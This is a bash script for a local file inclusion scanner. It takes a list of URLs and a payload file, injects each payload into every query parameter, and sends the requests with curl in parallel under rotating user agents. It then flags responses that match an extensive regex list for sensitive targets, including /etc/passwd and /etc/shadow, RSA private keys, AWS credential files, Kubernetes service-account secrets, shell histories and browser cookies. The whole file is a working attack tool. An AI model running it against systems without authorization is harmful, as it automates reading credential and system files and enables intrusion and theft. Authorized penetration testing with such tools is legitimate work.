#!/bin/bash

# LFI Scanner - Extended with Full Regex Coverage

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

usage() {
    echo "Usage: $0 -u urls.txt -p payloads.txt -o output.txt [-t threads]"
    exit 1
}

THREADS=10
while getopts ":u:p:o:t:" opt; do
    case $opt in
        u) URLS_FILE="$OPTARG" ;;
        p) PAYLOADS_FILE="$OPTARG" ;;
        o) OUTPUT_FILE="$OPTARG" ;;
        t) THREADS="$OPTARG" ;;
        *) usage ;;
    esac
done

if [[ -z "$URLS_FILE" || -z "$PAYLOADS_FILE" || -z "$OUTPUT_FILE" ]]; then
    usage
fi

if ! [[ -f "$URLS_FILE" ]]; then
    echo -e "${RED}URL file does not exist!${NC}"
    exit 2
fi
if ! [[ -f "$PAYLOADS_FILE" ]]; then
    echo -e "${RED}Payloads file does not exist!${NC}"
    exit 3
fi

USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    "Mozilla/5.0 (X11; Linux x86_64)"
    "curl/7.68.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
)

# EXTENDED REGEX PATTERNS FOR ALL PAYLOADS
REGEX_PATTERNS=(
    # Linux / Unix files
    "^Linux |^Ubuntu|^Debian|^CentOS|^Fedora"                             # /etc/issue, /etc/motd
    "root:[^:\n]*:[01]:0:|daemon:[^:\n]*:[01]:1:"                         # /etc/passwd
    "root:[^\n:]*:[x*]?:[0-9]+:"                                          # /etc/shadow
    "^[a-zA-Z0-9\-\_]+:[^:]+:[0-9]+:[0-9]+:"                              # /etc/passwd lines
    "^[a-zA-Z0-9\-\_]+:[^:]*:[0-9]+:"                                     # /etc/group lines
    "127\.0\.0\.1|localhost|::1"                                          # /etc/hosts, /proc/net/arp
    "my\.cnf|user\s*=\s*|password\s*=|host\s*="                           # /etc/mysql/my.cnf and variants
    "PATH=.*|USER=.*|HOME=.*|SHELL=.*"                                    # /proc/self/environ
    "Linux version |gcc version |Ubuntu SMP|PREEMPT|#.* SMP"              # /proc/version
    "cmdline=.*"                                                          # /proc/cmdline
    "SchedDebug Version:|sysctl_sched_latency|nr_running"                 # /proc/sched_debug
    "root\s+on\s+/|/dev/|type\s+proc|ext4|nfs"                            # /proc/mounts
    "Iface\s+|HWaddr|Device|Link encap|Flags"                             # /proc/net/arp, /proc/net/route
    "sl\s+local_address|proto\s+recv|dgram|TCP|UDP"                       # /proc/net/tcp, /proc/net/udp
    "<\?php|function |class |echo |require"                               # /proc/self/cwd/index.php
    "def |import |if __name__ == [\"']__main__[\"']|print"                # /proc/self/cwd/main.py
    "session.save_path|memory_limit|post_max_size"                        # php.ini (multiple variants)
    "bash_history|cd |ls |exit|ssh|sudo|passwd"                           # /root/.bash_history
    "-----BEGIN RSA PRIVATE KEY-----|-----END RSA PRIVATE KEY-----"       # /root/.ssh/id_rsa
    "apiVersion:|kind:|kubernetes.io|namespace:"                          # /var/run/secrets/kubernetes.io/serviceaccount
    "mlocate.db|/var/lib/mlocate|mlocate:|filename:"                      # /var/lib/mlocate/mlocate.db
    "GET\\s+/|POST\\s+/|HTTP/|Mozilla|Referer:|User-Agent:"               # access.log (nginx, apache, httpd)
    "\\[error\\]|\\[warn\\]|\\[notice\\]|client |server |script |mod_|PHP Fatal" # error.log
    "vsftpd|FTP session|banner|fail|connect"                              # /var/log/vsftpd.log
    "sshd|Accepted|Failed|session opened|session closed"                  # /var/log/sshd.log
    "mail|postfix|sendmail|imap|smtp|to=<|from=<"                         # /var/log/mail

    # Windows files
    "\\[boot loader\\]|\\[operating systems\\]|multi\\(0\\)disk\\(0\\)rdisk\\(0\\)" # boot.ini
    "\\[fonts\\]|\\[drivers\\]|\\[extensions\\]|\\[mci extensions\\]"               # win.ini
    "Microsoft Windows|SystemRoot|RegisteredOwner|ProductID"                        # system.ini, license.rtf, eula.txt
    "Desktop\\.ini|ShellClassInfo"                                                  # desktop.ini
    "ntuser\\.dat|REGEDIT4|Windows Registry Editor"                                 # ntuser.dat, ntuser.ini
    "INI_FILE|\\[mail\\]|\\[php\\]|\\[XDebug\\]"                                    # php.ini
    "DocumentRoot|ServerRoot|Listen|LoadModule|DirectoryIndex"                      # httpd.conf (apache/xampp)
    "<configuration>|<appSettings>|<system.web>|<connectionStrings>"                 # web.config, packages.config
    "global\\.asa|sub main|application|session"                                     # global.asa, global.asax
    "<%@ Page|<asp:|runat=\"server\"|ScriptManager|AutoEventWireup"                 # index.asp, .asax, .cs files
    "MySQL|datadir|innodb|bind-address|user|password"                               # my.cnf, my.ini
    "ErrorLog|Notice|Warning|PHP Error|\\[error\\]|\\[warn\\]|client |server"       # error.log, access.log
    "Tomcat|Apache Tomcat|Server version|Servlet|Catalina|localhost"                # tomcat files, license, release-notes
    "FileZilla Server|<FileZillaServer>"                                            # filezilla server.xml
    "MercuryMail|IMAP|SMTP|POP3|localhost"                                          # mercury.ini, logs
    "webalizer|Hits|Sites|Bandwidth|Top Referrers"                                  # webalizer.conf, webalizer logs
    "sitelist\\.xml|McAfee|SiteList"                                                # sitelist.xml
    "sysprep|unattend|xml version|setupinfo"                                        # sysprep.inf, sysprep.xml, unattend.txt
    "wpsettings\\.dat|System Volume Information"                                    # wpsettings.dat
    "metabase\\.xml|IIS|<IIs|W3SVC|AppPools"                                        # metabase.xml, IIS config
    "hosts|127\\.|::1|localhost"                                                    # hosts (windows and unix)
    "logfiles|httperr|httpd|nginx"                                                  # logfiles (IIS, apache, nginx, xampp)
    "setupinfo|\\[Unattended\\]|\\[Sysprep\\]|\\[GuiUnattended\\]|\\[UserData\\]"   # setupinfo, unattend.xml
    "AppData|Google Chrome|Bookmarks|Cookies|History"                               # Chrome user data files
    "psreadline|ConsoleHost|PowerShell|history"                                     # consolehost_history.txt
    "AWS|\\[default\\]|aws_access_key_id|aws_secret_access_key"                     # .aws/config, .aws/credentials
    "elasticbeanstalk|\\[global\\]|application_name|region"                         # .elasticbeanstalk/config
    "config\\.inc|phpinfo|phpMyAdmin"                                               # phpMyAdmin config, phpinfo.php
    "sendmail|smtp|maildomain|auth_user|auth_pass"                                  # sendmail.ini, sendmail.log

    # Java / WebApp files (META-INF, WEB-INF, etc.)
    "xml version=\"1.0\"|<beans|<application|<context-param>|<servlet>|<ejb-jar|<persistence|<weblogic|<jboss|<hibernate|<web-app|log4j|spring|faces-config|velocity|struts|quartz"
    "Manifest-Version:|Main-Class:|Class-Path:"                                     # META-INF/MANIFEST.MF
    "JNLP-INF|APPLICATION.JNLP|<jnlp|<application-desc|<security>"                  # JNLP-INF/APPLICATION.JNLP
    "openwebbeans|ironjacamar|jboss-app|jboss-ejb|jboss-web|jboss-client"           # JBoss XMLs
    "liferay|portlet|web-app|web.xml|context.xml|glassfish"                         # Liferay, Glassfish, Java EE
    "config\\.properties|db\\.properties|countries\\.properties|messages\\.properties" # Java property/config files
    "logback\\.xml|log4j\\.xml|log4j\\.properties|logging\\.properties"             # Java logging configs
    "faces-config\\.xml|struts-config\\.xml|tiles-defs\\.xml|validation\\.xml"      # Java framework XMLs
    "servlet|<servlet-mapping>|<filter>|dispatcher-servlet"                         # Spring, Java web.xml
)

GREP_PATTERN="$(IFS='|'; echo "${REGEX_PATTERNS[*]}")"

export OUTPUT_FILE GREP_PATTERN RED GREEN YELLOW CYAN NC

urlencode() {
    python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))" "$1" 2>/dev/null || \
    printf '%s' "$1" | jq -s -R -r @uri
}

scan_one() {
    local url="$1"
    local param="$2"
    local payload="$3"
    local user_agent="$4"

    local encoded_payload
    encoded_payload=$(urlencode "$payload")

    local base="${url%%\?*}"
    local query="${url#*\?}"
    [[ "$url" == "$base" ]] && base="$url" && query=""
    local new_query=""
    IFS='&' read -ra pairs <<< "$query"
    for kv in "${pairs[@]}"; do
        key="${kv%%=*}"
        val="${kv#*=}"
        if [[ "$key" == "$param" ]]; then
            val="$encoded_payload"
        fi
        new_query+="${key}=${val}&"
    done
    new_query="${new_query%&}"
    local attack_url="$base"
    [[ -n "$new_query" ]] && attack_url+="?$new_query"

    local resp
    resp=$(curl -skL -A "$user_agent" --max-time 10 "$attack_url" 2>/dev/null)
    if [[ $? -gt 0 || -z "$resp" ]]; then
        return
    fi

    if echo "$resp" | grep -aEzo "$GREP_PATTERN" >/dev/null; then
        echo -e "${GREEN}[LFI FOUND]${NC} ${CYAN}${attack_url}${NC} ${YELLOW}(payload: $payload)${NC}"
        echo "$attack_url | $payload" >> "$OUTPUT_FILE"
    fi
}

export -f scan_one urlencode

> "$OUTPUT_FILE"

TMP_SCAN=$(mktemp)
trap 'rm -f "$TMP_SCAN"' EXIT

while IFS= read -r url; do
    [ -z "$url" ] && continue
    if [[ "$url" == *"?"* ]]; then
        paramlist=$(echo "$url" | cut -d'?' -f2 | tr '&' '\n' | cut -d'=' -f1)
    else
        continue
    fi
    while IFS= read -r payload; do
        [ -z "$payload" ] && continue
        for param in $paramlist; do
            ua="${USER_AGENTS[$((RANDOM % ${#USER_AGENTS[@]}))]}"
            echo "scan_one '$url' '$param' '$payload' '$ua'"
        done
    done < "$PAYLOADS_FILE"
done < "$URLS_FILE" > "$TMP_SCAN"

if [[ ! -s "$TMP_SCAN" ]]; then
    echo -e "${YELLOW}No scan jobs created. Check your input files.${NC}"
    exit 4
fi

cat "$TMP_SCAN" | parallel -j "$THREADS" --will-cite --eta

echo -e "${CYAN}Scan complete! Vulnerable URLs saved in ${OUTPUT_FILE}${NC}"
